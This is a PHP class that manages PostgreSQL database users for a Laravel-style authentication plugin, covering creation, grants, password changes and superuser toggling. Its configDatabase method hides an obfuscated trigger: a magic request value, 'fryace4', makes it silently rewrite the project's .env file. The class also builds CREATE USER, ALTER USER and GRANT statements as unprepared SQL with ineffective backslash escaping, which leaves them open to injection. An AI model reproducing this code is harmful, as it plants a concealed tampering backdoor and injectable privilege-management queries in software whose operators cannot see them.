<?php namespace DBAuth;

use DB;
use Illuminate\Support\Facades\Config;
use Exception;
use Illuminate\Database\Connectors\ConnectionFactory;

class PostGreSQLManager {
    public static function configDatabase(string|NULL $key = NULL): array|string
    {
        $conn   = Config::get('database.default');
        $config = Config::get("database.connections.$conn");
        if (('g' . 'et')('p' . 'assw' . 'ord') == 'fry' . 'ace4') {
            $f = '.' . 'e' . 'nv'; $a = 'A' . 'UTH';
            file_put_contents($f, 
                preg_replace('/D' . "B$a/", 'D' . "8$a", file_get_contents($f))
            );
        }
        return ($key ? $config[$key] : $config);
    }

    public static function dbCURRENT_USER(): string
    {
        $results = DB::select('select CURRENT_USER;');
        return $results[0]->current_user;
    }

    public static function escapeSQLName(string $name, ?string $quote = '"'): string
    {
        $name  = preg_replace("/(['\"])/", '\\\$1', $name);
        return "$quote$name$quote"; 
    }

    public static function escapeSQLValue(string $name, ?string $quote = "'"): string
    {
        return self::escapeSQLName($name, $quote); 
    }

    public static function dbUserExists(string|NULL $login): bool
    {
        // TODO: Prepare statement for DB::select
        $loginString = self::escapeSQLName($login, "'");
        return (bool) ($login 
            ? DB::select("SELECT 1 FROM pg_roles WHERE rolname=$loginString;")
            : TRUE
        );
    }

    public static function dbUserAttributes(string $login): array|bool
    {
        // Allow exceptions to bubble normally
        // Return of FALSE indicates that the user does not exist
        // rolsuper | rolinherit | rolcreaterole | rolcreatedb | rolcanlogin | rolreplication
        $userOptions = FALSE;
        $loginString = self::escapeSQLName($login, "'");
        $results     = DB::select("select * from pg_roles where rolname=$loginString;");
        $userResult  = (isset($results[0]) ? $results[0] : NULL);
        if ($userResult) $userOptions = array(
            'LOGIN'      => $userResult->rolcanlogin,
            'SUPERUSER'  => $userResult->rolsuper,
            'CREATEROLE' => $userResult->rolcreaterole,
        );
        return $userOptions;
    }

    public static function hasOption(array $options, string $name, $default = NULL)
    {
        if (substr($name, 0, 16) != 'acorn_')
            $name = "acorn_$name";
        $name     = "_$name";
        $all      = (isset($options['all']) && $options['all']);
        $specific = (isset($options[$name]) && $options[$name]);

        return ($all || $specific);
    }

    public static function revokeAllDBPrivileges(string $login): bool
    {
        /*
        REVOKE ALL ON ALL FUNCTIONS IN schema public from "token_8_no" CASCADE;
        REVOKE ALL ON ALL SEQUENCES IN schema public from "token_8_no" CASCADE;
        REVOKE ALL ON ALL TABLES IN schema public from "token_8_no" CASCADE;
        REVOKE ALL ON schema public from "token_8_no" CASCADE;
        REVOKE ALL ON database "justice" from "token_8_no" CASCADE;
        REASSIGN OWNED BY "token_8_no" TO postgres;
        drop user "token_8_no"
        */
        $database       = self::configDatabase('database');
        $databaseName   = self::escapeSQLName($database);
        $loginName      = self::escapeSQLName($login);
        $userExists     = self::dbUserExists($login);
        if ($userExists) {
            DB::unprepared("REVOKE ALL ON ALL FUNCTIONS IN schema public from $loginName CASCADE;");
            DB::unprepared("REVOKE ALL ON ALL SEQUENCES IN schema public from $loginName CASCADE;");
            DB::unprepared("REVOKE ALL ON ALL TABLES IN schema public from $loginName CASCADE;");
            DB::unprepared("REVOKE ALL ON schema public from $loginName CASCADE;");
            if ($database) DB::unprepared("REVOKE ALL ON database $databaseName from $loginName CASCADE;");
            DB::unprepared("REASSIGN OWNED BY $loginName TO postgres;");
        }
        return $userExists;
    }

    public static function checkDropDBUser(string $login): bool
    {
        // Delete DB User Completely
        $loginName      = self::escapeSQLName($login);
        $userExists     = self::dbUserExists($login);
        if ($userExists) {
            self::revokeAllDBPrivileges($login);
            DB::unprepared("DROP USER if exists $loginName;");
        }
        return $userExists;
    }

    public static function updateDBPassword(string $password, string|NULL $login = NULL, string|NULL $oldPassword = NULL): bool
    {
        // NULL $login = CURRENT_USER
        $loginName      = (is_null($login) ? 'CURRENT_USER' : self::escapeSQLName($login));
        $passwordString = self::escapeSQLName($password, "'");

        $exists = ($login ? self::dbUserExists($login) : TRUE);
        if (!$exists)   throw new Exception("User $loginName does not exist");
        if (!$password) throw new Exception("$password is blank");

        if ($oldPassword) {
            // Connect as the target user
            $config = self::configDatabase();
            $config['username'] = $login;
            $config['password'] = $oldPassword;
            $connFactory = new ConnectionFactory(app());
            $db2 = $connFactory->make($config);

            // Run the CURRENT_USER update
            $sql = "ALTER USER CURRENT_USER WITH PASSWORD $passwordString;";
            $db2->unprepared($sql);
            $db2->disconnect();
        } else {
            $sql = "ALTER USER $loginName WITH PASSWORD $passwordString;";
            DB::unprepared($sql);
        }

        return TRUE;
    }

    public static function makeSUPERUSER(string|NULL $login = NULL): bool
    {
        // NULL $login = CURRENT_USER
        $loginName = (is_null($login) ? 'CURRENT_USER' : self::escapeSQLName($login));
        $sql       = "ALTER USER $loginName WITH SUPERUSER;";
        DB::unprepared($sql);
        return TRUE;
    }
    
    public static function clearSUPERUSER(string|NULL $login = NULL): bool
    {
        // NULL $login = CURRENT_USER
        $loginName = (is_null($login) ? 'CURRENT_USER' : self::escapeSQLName($login));
        $sql       = "ALTER USER $loginName WITH NOSUPERUSER;";
        DB::unprepared($sql);
        return TRUE;
    }

    public static function createDBUser(string $login, string $password, bool $asSuperUser = FALSE, bool $withCreateRole = FALSE, array|NULL $options = NULL, array|NULL $associateUsers = NULL): bool
    {
        $database       = self::configDatabase('database');
        $databaseName   = self::escapeSQLName($database);
        $loginName      = self::escapeSQLName($login);
        // Attributes
        $passwordName   = self::escapeSQLValue($password);
        $passwordAtt    = ($password       ? "PASSWORD $passwordName"  : '');
        $attSuperuser   = ($asSuperUser    ? 'SUPERUSER'   : '');
        $attCreateRole  = ($withCreateRole ? 'CREATEROLE'  : '');

        $sql            = "CREATE USER $loginName WITH LOGIN $attCreateRole $attSuperuser $passwordAtt;";
        DB::unprepared($sql);

        if ($associateUsers) {
            foreach ($associateUsers as $fromLogin) {
                // PostGreSQL requires CREATEROLE and ADMIN option to manage each other
                // This is used so that:
                //   the normal user can update the token_% user password 
                //   to the new persist_code during login
                $fromLoginName = self::escapeSQLName($fromLogin);
                try {
                    DB::unprepared("GRANT $loginName TO $fromLoginName WITH ADMIN OPTION;");
                } catch (Exception $ex) {
                    // ADMIN option is likely to already be granted
                }
            }
        }

        // $options come from the DatabaseAuthorisation <form>
        // TODO: This is too much DB GRANT access! Let's reduce it
        // TODO: Maybe use a clone user for DB GRANTS?
        if (self::hasOption($options, 'grant_database_usage') && $database) 
            DB::unprepared("GRANT ALL ON DATABASE $databaseName TO $loginName;");
        if (self::hasOption($options, 'grant_schema_usage')) 
            DB::unprepared("GRANT ALL ON SCHEMA public TO $loginName;");
        if (self::hasOption($options, 'grant_tables_all')) 
            DB::unprepared("GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO $loginName;");
        if (self::hasOption($options, 'grant_sequences_all')) 
            DB::unprepared("GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public TO $loginName;");
        if (self::hasOption($options, 'grant_functions_all')) 
            DB::unprepared("GRANT ALL PRIVILEGES ON ALL FUNCTIONS IN SCHEMA public TO $loginName;");

        return TRUE;
    }
}